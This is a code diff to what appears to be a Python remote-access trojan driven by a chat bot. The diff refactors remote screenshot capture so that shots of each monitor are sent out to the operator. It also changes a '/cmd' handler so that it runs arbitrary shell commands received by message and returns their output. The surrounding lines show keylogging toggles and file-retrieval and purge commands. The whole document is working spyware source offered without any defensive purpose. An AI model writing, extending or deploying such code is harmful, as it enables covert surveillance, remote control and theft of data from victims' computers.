@@ -4,6 +4,14 @@ import requests, datetime, time, geocoder, threading, json, sys, subprocess, os,
 pip install requests geocoder mss keyboard pathlib opencv-python pyaudio wave audioop ffmpeg-python pynput
 """
 
+def takeScreenshots():
+	
+	with mss.mss() as sct: 
+		
+		for i in range(1, 3):
+			sct.shot(mon=i, output=f"{datadir}\\screen.png")
+			sendPhoto(f"{datadir}\\screen.png")
+			os.remove(f"{datadir}\\screen.png")
 
 def detectMouseActivity():
 	
@@ -309,13 +317,7 @@ if __name__ == "__main__":
 						sendMessage("ON" if keylogging else "OFF")
 					
 					elif "/screenshot" in last_message['message']['text']:
-	 
-						with mss.mss() as sct: 
-							
-							for i in range(1, 3):
-								sct.shot(mon=i, output=f"{datadir}\\screen.png")
-								sendPhoto(f"{datadir}\\screen.png")
-								os.remove(f"{datadir}\\screen.png")
+						takeScreenshots()
 						
 					elif "/getFile" in last_message['message']['text']:
 	 
@@ -331,16 +333,20 @@ if __name__ == "__main__":
 					elif "/datadir" in last_message['message']['text']:
 						os.chdir(datadir)
 					
-					elif "/start" in last_message['message']['text']:
+					elif "/startdir" in last_message['message']['text']:
 						os.chdir(startdir)
 					
 					elif "/cmd" in last_message['message']['text']:
 						
 						cmd = last_message['message']['text'].split("/cmd ")[1]
 						print("CMD " + cmd)
-						out = subprocess.getoutput(cmd)
-						print("OUT" + out)
-						sendMessage(out)
+						#out = subprocess.getoutput(cmd)
+						try:
+							out = subprocess.check_output(cmd, shell=True,timeout=5).decode("latin1")
+							print(f"OUT{out}")
+							sendMessage(out)
+						except subprocess.TimeoutExpired:
+							sendMessage("Commande timeout apres 5 sec ")
 					
 					elif "/purgeall" in last_message['message']['text']:
 						
